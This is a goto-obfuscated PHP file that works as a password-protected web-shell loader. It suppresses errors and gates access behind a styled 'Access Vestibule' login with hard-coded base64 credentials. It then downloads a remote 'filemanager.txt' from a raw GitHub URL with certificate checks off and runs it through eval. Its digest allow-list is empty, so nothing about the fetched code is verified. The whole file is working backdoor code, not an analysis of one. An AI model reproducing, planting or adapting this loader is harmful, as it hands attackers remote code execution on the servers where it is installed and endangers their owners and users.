<?php
goto vCqvt;
RihUa:
if (!empty($authorized_digests)) {
    $digest = hash("sha256", $remote_blob);
    if (!in_array($digest, $authorized_digests, true)) {
        http_response_code(403);
        exit("Integrity constraint violation: digest mismatch.");
    }
}
goto S1vuV;
TVH_R:
$principal = base64_decode($en);
goto PyHWF;
PyHWF:
$seal = base64_decode($isx);
goto vEXwW;
qmkeA:
$en = "YWRtaW4=";
goto BSyAc;
c_9kh:
session_start();
goto qmkeA;
vCqvt:
error_reporting(0);
goto c_9kh;
CNBcJ:
$remote_blob = aBOph($remote_manifest);
goto qBZzF;
qBZzF:
if ($remote_blob === false || trim($remote_blob) === "") {
    http_response_code(502);
    exit("Remote acquisition failed: manifest unobtainable.");
}
goto RihUa;
BSyAc:
$isx = "Nzc3Nzc3Nzc3Nzc3Nzc===";
goto TVH_R;
deBCl:
$authorized_digests = [];
goto NWEry;
Hz18r:
function abOPh(string $uri)
{
    goto yuB12;
    pYsoS:
    if ($code !== 200 || $payload === false || trim($payload) === "") {
        return false;
    }
    goto CAIle;
    L6TlH:
    $c = curl_init();
    goto TRBk1;
    FHSkj:
    curl_setopt($c, CURLOPT_TIMEOUT, 15);
    goto oGD2i;
    AiOmD:
    curl_setopt($c, CURLOPT_FOLLOWLOCATION, true);
    goto QEhug;
    QEhug:
    curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
    goto FHSkj;
    oTopo:
    if ($payload !== false) {
        return $payload;
    }
    goto f0HNq;
    d2CkJ:
    curl_close($c);
    goto pYsoS;
    oGD2i:
    $payload = curl_exec($c);
    goto VZqZB;
    yuB12:
    $payload = @file_get_contents($uri);
    goto oTopo;
    f0HNq:
    if (!function_exists("curl_init")) {
        return false;
    }
    goto L6TlH;
    TRBk1:
    curl_setopt($c, CURLOPT_URL, $uri);
    goto OmBtn;
    CAIle:
    return $payload;
    goto Yj0X0;
    VZqZB:
    $code = curl_getinfo($c, CURLINFO_HTTP_CODE);
    goto d2CkJ;
    OmBtn:
    curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
    goto AiOmD;
    Yj0X0:
}
goto CNBcJ;
vEXwW:
$remote_manifest =
    "https://raw.githubusercontent.com/tikung6etar/Nyarek/refs/heads/master/filemanager.txt";
goto deBCl;
NWEry:
if (!isset($_SESSION["authenticated_entitlement"])) {

    goto bRO6h;
    bRO6h:
    if ($_SERVER["REQUEST_METHOD"] === "POST") {
        goto Iwtm6;
        wIjBQ:
        if ($supplied_principal === $principal && $supplied_seal === $seal) {
            goto iueWb;
            iueWb:
            $_SESSION["authenticated_entitlement"] = true;
            goto SKiVp;
            SKiVp:
            header("Location: " . $_SERVER["PHP_SELF"]);
            goto Ntkig;
            Ntkig:
            exit();
            goto IRYvU;
            IRYvU:
        } else {
            $errstr = "Authentication credentials incongruent.";
        }
        goto dyIWx;
        Iwtm6:
        $supplied_principal = trim($_POST["uid"] ?? "");
        goto hnAOp;
        hnAOp:
        $supplied_seal = trim($_POST["pwd"] ?? "");
        goto wIjBQ;
        dyIWx:
    }
    goto aIgdK;
    aIgdK:
    ?>
    <!doctype html>
    <html lang="en">
    <head>
        <meta charset="utf-8">
        <title>Access Vestibule</title>
        <meta name="viewport" content="width=device-width,initial-scale=1">
        <style>
            body { font-family: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial; background:#fafafa; color:#111; padding:30px; }
            .card { max-width:480px; margin:28px auto; padding:20px; border:1px solid #e6e6e6; border-radius:8px; background:#fff; box-shadow:0 2px 6px rgba(0,0,0,.04); }
            label { display:block; margin:12px 0 6px; font-size:14px; color:#333; }
            input[type="text"], input[type="password"] { width:100%; padding:10px; border:1px solid #ddd; border-radius:6px; box-sizing:border-box; }
            input[type="submit"] { margin-top:16px; padding:10px 14px; border:0; border-radius:6px; background:#0b76ef; color:#fff; cursor:pointer; }
            .muted { color:#666; font-size:13px; margin-top:8px; }
            .err { color:#b00020; margin-bottom:8px; }
        </style>
    </head>
    <body>
    <div class="card" role="main" aria-labelledby="hdr">
        <h2 id="hdr">Access Vestibule</h2>
        <?php
        goto iJj32;
        zgusN:
        exit();
        goto cVklO;
        rmdEx:
        ?>
        <form method="POST" novalidate>
            <label for="uid">User Designation</label>
            <input id="uid" name="uid" type="text" autocomplete="username" required>

            <label for="pwd">Cryptographic Passphrase</label>
            <input id="pwd" name="pwd" type="password" autocomplete="current-password" required>

            <input type="submit" value="Solicit Entitlement">
            <p class="muted">Supply credential tuple to proceed to the execution domain.</p>
        </form>
    </div>
    </body>
    </html>
    <?php
    goto zgusN;
    iJj32:
    if (isset($errstr)) {
        echo "<div class=\"err\">" .
            htmlspecialchars($errstr, ENT_QUOTES | ENT_SUBSTITUTE, "UTF-8") .
            "</div>";
    }
    goto rmdEx;
    cVklO:

}
goto Hz18r;
S1vuV:
try {
    goto zn843;
    GPA83:
    echo $collected;
    goto gg81i;
    gDlme:
    header("Content-Type: text/html; charset=utf-8");
    goto GPA83;
    yqy1s:
    $collected = ob_get_clean();
    goto gDlme;
    lk3qS:
    eval("?>" . $remote_blob);
    goto yqy1s;
    gg81i:
    exit();
    goto PROW6;
    zn843:
    ob_start();
    goto lk3qS;
    PROW6:
} catch (Throwable $t) {
    goto gziIZ;
    gziIZ:
    while (ob_get_level() > 0) {
        ob_end_clean();
    }
    goto tVVc3;
    tVVc3:
    http_response_code(500);
    goto E2Edt;
    lVxYG:
    echo $msg;
    goto keTps;
    keTps:
    exit();
    goto FpqYc;
    E2Edt:
    $msg =
        "Execution anomaly: " .
        htmlspecialchars(
            $t->getMessage(),
            ENT_QUOTES | ENT_SUBSTITUTE,
            "UTF-8"
        );
    goto lVxYG;
    FpqYc:
}
